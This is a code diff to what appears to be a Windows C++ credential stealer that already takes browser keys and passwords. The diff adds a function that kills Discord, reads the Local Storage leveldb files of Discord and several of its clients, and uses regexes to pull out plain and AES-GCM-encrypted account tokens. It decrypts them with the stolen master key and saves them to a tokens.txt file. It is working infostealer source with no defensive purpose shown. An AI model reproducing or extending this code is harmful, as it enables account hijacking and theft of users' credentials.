@@ -11,6 +11,8 @@
 #include <algorithm>
 #include <memory>
 #include <cstring>
+#include <regex>
+#include <set>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -50,6 +52,7 @@ void clear_hardware_breakpoints(uint32_t process_id);
 void set_resume_flag(uint32_t thread_id);
 bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir);
+void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name);
 
 int main() {
     std::vector<BrowserConfig> configs = {
@@ -175,6 +178,7 @@ int main() {
     kill_processes_by_name("waterfox.exe");
     kill_processes_by_name("librewolf.exe");
     kill_processes_by_name("thunderbird.exe");
+    kill_processes_by_name("discord.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
@@ -291,6 +295,30 @@ int main() {
             CloseHandle(pi.hThread);
         } else {
             std::cerr << "Failed to create " << config.name << " process. Error: " << GetLastError() << std::endl;
+        }
+    }
+
+    // Discord extraction
+    struct DiscordConfig {
+        std::string name;
+        std::wstring subdir;
+    };
+    std::vector<DiscordConfig> discords = {
+        {"Discord", L"discord"},
+        {"Discord Canary", L"discordcanary"},
+        {"Discord PTB", L"discordptb"},
+        {"Lightcord", L"Lightcord"}
+    };
+
+    wchar_t* appdata;
+    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
+        fs::path roaming(appdata);
+        CoTaskMemFree(appdata);
+        for (const auto& d : discords) {
+            fs::path p = roaming / d.subdir;
+            if (fs::exists(p)) {
+                extract_discord_tokens(p.wstring(), d.name);
+            }
         }
     }
 
@@ -1082,6 +1110,69 @@ bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
     f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
 
     return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
+}
+
+void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name) {
+    fs::path discord_path(discord_path_w);
+    if (!fs::exists(discord_path)) return;
+
+    std::vector<uint8_t> master_key;
+    bool is_dpapi;
+    if (!get_v10_key(discord_path_w, master_key, is_dpapi)) return;
+
+    fs::path leveldb_path = discord_path / "Local Storage" / "leveldb";
+    if (!fs::exists(leveldb_path)) return;
+
+    std::set<std::string> tokens;
+    // Discord tokens regex patterns
+    std::regex enc_regex("dQw4w9WgXcQ:([^\"\\s]+)");
+    std::regex plain_regex("[\\w\\d_-]{24,28}\\.[\\w\\d_-]{6}\\.[\\w\\d_-]{25,110}");
+
+    for (const auto& entry : fs::directory_iterator(leveldb_path)) {
+        std::string ext = entry.path().extension().string();
+        if (ext == ".log" || ext == ".ldb") {
+            std::ifstream ifs(entry.path(), std::ios::binary);
+            if (ifs) {
+                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+
+                // Scan for encrypted tokens
+                auto enc_begin = std::sregex_iterator(content.begin(), content.end(), enc_regex);
+                auto enc_end = std::sregex_iterator();
+                for (auto i = enc_begin; i != enc_end; ++i) {
+                    std::string enc_val = (*i)[1].str();
+                    // Handle trailing chars if any
+                    if (!enc_val.empty() && enc_val.back() == '\\') enc_val.pop_back();
+
+                    std::vector<uint8_t> enc_bytes = base64_decode(enc_val);
+                    if (!enc_bytes.empty()) {
+                        // Discord encrypted tokens in leveldb are v10 blobs (AES-GCM)
+                        std::vector<uint8_t> dec = decrypt_blob(enc_bytes, master_key, {}, false);
+                        if (!dec.empty()) {
+                            tokens.insert(std::string(dec.begin(), dec.end()));
+                        }
+                    }
+                }
+
+                // Scan for plain tokens
+                auto plain_begin = std::sregex_iterator(content.begin(), content.end(), plain_regex);
+                auto plain_end = std::sregex_iterator();
+                for (auto i = plain_begin; i != plain_end; ++i) {
+                    tokens.insert((*i).str());
+                }
+            }
+        }
+    }
+
+    if (!tokens.empty()) {
+        fs::path out_root("discord_extract");
+        fs::path out_dir = out_root / output_name;
+        fs::create_directories(out_dir);
+        std::ofstream ofs(out_dir / "tokens.txt");
+        for (const auto& token : tokens) {
+            ofs << token << "\n";
+        }
+        std::cout << "Extracted " << tokens.size() << " Discord tokens from " << output_name << std::endl;
+    }
 }
 
 void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir) {
